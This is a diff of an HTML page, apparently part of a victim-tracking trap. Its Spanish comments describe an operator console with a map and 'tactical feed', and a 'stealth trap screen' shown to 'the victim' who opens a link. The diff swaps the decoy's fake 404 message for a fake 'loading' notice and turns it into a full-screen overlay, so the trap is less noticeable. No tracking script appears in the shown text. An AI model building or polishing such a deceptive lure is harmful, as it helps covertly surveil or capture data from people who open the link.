@@ -10,10 +10,11 @@
 </head>
 <body>
 
-    <!-- Consola Normal (Solo se ve si entras a la URL limpia) -->
+    <!-- Consola Normal (Tu PC) -->
     <div class="console-container" id="main-console">
         <div class="top-screen">
             <div id="map"></div>
+            
             <div class="notification-banner" id="banner-status">
                 TACTICAL FEED<br>AWAITING SIGNAL...
             </div>
@@ -37,11 +38,11 @@
         </div>
     </div>
 
-    <!-- Pantalla trampa sigilosa (Lo que ve la víctima al abrir el enlace) -->
-    <div id="stealth-screen" style="display: none; background: #000; color: #0ff; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: monospace;">
+    <!-- Pantalla trampa sigilosa (Lo que ve la víctima por un segundo antes de que se cierre/limpie) -->
+    <div id="stealth-screen" style="display: none; background: #000; color: #0ff; height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 9999; justify-content: center; align-items: center; font-family: monospace;">
         <div style="text-align: center;">
-            <h2>404 - Página no encontrada</h2>
-            <p>El recurso solicitado no está disponible.</p>
+            <h2>Cargando recurso...</h2>
+            <p>Por favor espere un momento.</p>
         </div>
     </div>
 
